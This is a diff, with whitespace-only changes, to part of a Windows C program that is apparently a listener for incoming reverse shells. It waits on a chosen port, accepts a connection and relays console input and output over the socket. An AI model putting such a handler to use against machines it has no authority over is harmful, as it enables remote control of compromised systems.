@@ -28,8 +28,8 @@ int main(int argc, char *argv[])
     int  port = 0;
     char portbuf[16] = {0};
 
-    if (argc >= 2) port = atoi(argv[1]);         
-    while (port <= 0) {                         
+    if (argc >= 2) port = atoi(argv[1]);
+    while (port <= 0) {
         printf("Listen port: ");
         fgets(portbuf, sizeof(portbuf), stdin);
         port = atoi(portbuf);
@@ -47,10 +47,10 @@ int main(int argc, char *argv[])
     printf("[*] Waiting for reverse shell on port %d ...\n", port);
     SOCKET s = accept(lst, NULL, NULL);
     printf("[+] Connection established!\n");
-    CreateThread(NULL,0, PumpSockToConsole,(LPVOID)s, 0, NULL);  
+    CreateThread(NULL,0, PumpSockToConsole,(LPVOID)s, 0, NULL);
     SOCKET prm = s;
-    CreateThread(NULL,0, PumpConsoleToSock, &prm,    0, NULL); 
-    WaitForSingleObject(GetCurrentThread(), INFINITE); 
+    CreateThread(NULL,0, PumpConsoleToSock, &prm,    0, NULL);
+    WaitForSingleObject(GetCurrentThread(), INFINITE);
     closesocket(s); closesocket(lst); WSACleanup();
     return 0;
 }
